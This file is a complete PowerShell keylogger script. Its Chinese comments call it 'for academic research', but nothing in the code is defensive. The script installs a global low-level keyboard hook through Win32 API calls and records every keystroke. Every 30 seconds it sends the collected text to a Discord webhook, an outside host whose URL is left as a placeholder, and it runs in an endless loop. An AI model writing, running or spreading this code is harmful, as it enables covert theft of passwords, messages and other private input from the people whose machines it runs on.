
# 學術研究用 keylogger.ps1 - 使用低階鍵盤鉤子版本（全域捕捉）
# 注意：需以管理員身分執行或在允許環境下測試

Add-Type -AssemblyName System.Windows.Forms

$webhook = "https://discord.com/api/webhooks/您的Webhook網址"  # ← 務必替換

$logBuffer = ""
$lastSend = Get-Date

# 定義 Win32 API 匯入（低階鍵盤鉤子）
Add-Type -MemberDefinition @"
    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    public struct KBDLLHOOKSTRUCT {
        public uint vkCode;
        public uint scanCode;
        public uint flags;
        public uint time;
        public IntPtr dwExtraInfo;
    }
"@ -Name Win32 -Namespace API

# 鉤子回呼函式
$hookProc = {
    param (
        [int]$nCode,
        [IntPtr]$wParam,
        [IntPtr]$lParam
    )

    if ($nCode -ge 0 -and $wParam -eq 0x0100) {  # WM_KEYDOWN
        $kbStruct = [Marshal]::PtrToStructure($lParam, [Type][API.Win32+KBDLLHOOKSTRUCT])
        $vk = $kbStruct.vkCode

        $char = ""
        switch ($vk) {
            8   { $char = "[BKSP]" }
            9   { $char = "[TAB]" }
            13  { $char = "[ENTER]" }
            27  { $char = "[ESC]" }
            32  { $char = " " }
            160 { $char = "[LSHIFT]" }
            161 { $char = "[RSHIFT]" }
            162 { $char = "[LCTRL]" }
            163 { $char = "[RCTRL]" }
            default {
                if ($vk -ge 48 -and $vk -le 90) {
                    $char = [char]$vk
                    if (-not [Console]::CapsLock -and -not [API.Win32]::GetKeyState(0x10)) { $char = $char.ToLower() }
                } else {
                    $char = "[$vk]"
                }
            }
        }

        if ($char -ne "") {
            $script:logBuffer += $char
        }
    }

    return [API.Win32]::CallNextHookEx([IntPtr]::Zero, $nCode, $wParam, $lParam)
}

# 安裝鉤子
$moduleHandle = [API.Win32]::GetModuleHandle($null)
$global:hook = [API.Win32]::SetWindowsHookEx(13, $hookProc, $moduleHandle, 0)  # 13 = WH_KEYBOARD_LL

if ($global:hook -eq [IntPtr]::Zero) {
    "Hook installation failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" | Out-File -FilePath "$env:TEMP\keylog_error.txt" -Append
}

# 強制發送測試訊息（確認 Webhook 通路）
$testPayload = @{ content = "Keylogger hook started at $(Get-Date) - Test message" } | ConvertTo-Json -Compress
try {
    Invoke-RestMethod -Uri $webhook -Method Post -Body $testPayload -ContentType 'application/json' -ErrorAction Stop
} catch {
    $_ | Out-File -FilePath "$env:TEMP\keylog_error.txt" -Append
}

# 主迴圈：收集並定期傳送
while ($true) {
    Start-Sleep -Milliseconds 50  # 降低 CPU 使用率

    if ($logBuffer.Length -gt 0 -and ((Get-Date) - $lastSend).TotalSeconds -ge 30) {
        $payload = @{ content = "Keylog: $logBuffer" } | ConvertTo-Json -Compress
        try {
            Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
            $logBuffer = ""
            $lastSend = Get-Date
        } catch {
            $_ | Out-File -FilePath "$env:TEMP\keylog_error.txt" -Append
        }
    }
}

# 清理（理論上不會執行到這裡）
[API.Win32]::UnhookWindowsHookEx($global:hook)
